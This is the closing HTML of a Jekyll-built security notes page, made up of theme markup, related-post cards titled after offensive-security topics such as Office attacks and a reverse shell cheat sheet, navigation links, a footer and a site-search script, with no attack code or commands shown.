      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/Office-Attacks/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 22, 2021
  

  <i class="unloaded">2021-04-22T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Office - Attacks</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  XLSM - Hot Manchego
  XLS - Macrome
  XLM Excel 4.0 - SharpShooter
  XLM Excel 4.0 - EXCELntDonut
  XLM Excel 4.0 - EXEC
  DOCM - Metasploit
  DOCM - Download and Execute
  DOCM - Macro...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Reverse-Shell-Cheatsheet/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Apr 26, 2021
  

  <i class="unloaded">2021-04-26T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Reverse Shell Cheat Sheet</h3>
            <div class="text-muted small">
              <p>
                





                Summary


  Reverse Shell
    
      Awk
      Automatic Reverse Shell Generator
      Bash TCP
      Bash UDP
      C
      Dart
      Golang
      Groovy Alternative 1
      Groovy
      Java Alt...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/Cloud-AWS-Pentest/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    May  1, 2021
  

  <i class="unloaded">2021-05-01T00:00:00+07:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>AWS</h3>
            <div class="text-muted small">
              <p>
                





                
  Amazon Web Services offers reliable, scalable, and inexpensive cloud computing services.


Summary


  AWS
    
      Summary
      Training
      Tools
      AWS Patterns
      AWS - Metadata S...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/Cloud-AWS-Pentest/" class="btn btn-outline-primary"
    prompt="Older">
    <p>AWS</p>
  </a>
  

  
  <a href="/Windows-Mimikatz/" class="btn btn-outline-primary"
    prompt="Newer">
    <p>Windows - Mimikatz</p>
  </a>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2022
        <a href="https://twitter.com/Zxce3_">Zxce3</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/injection/">Injection</a>
      
        
        <a class="post-tag" href="/tags/database/">Database</a>
      
        
        <a class="post-tag" href="/tags/server/">Server</a>
      
        
        <a class="post-tag" href="/tags/network/">Network</a>
      
        
        <a class="post-tag" href="/tags/windows/">Windows</a>
      
        
        <a class="post-tag" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag" href="/tags/shell/">Shell</a>
      
        
        <a class="post-tag" href="/tags/sql/">SQL</a>
      
        
        <a class="post-tag" href="/tags/xss/">XSS</a>
      
        
        <a class="post-tag" href="/tags/attack/">Attack</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="http://localhost:4000{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

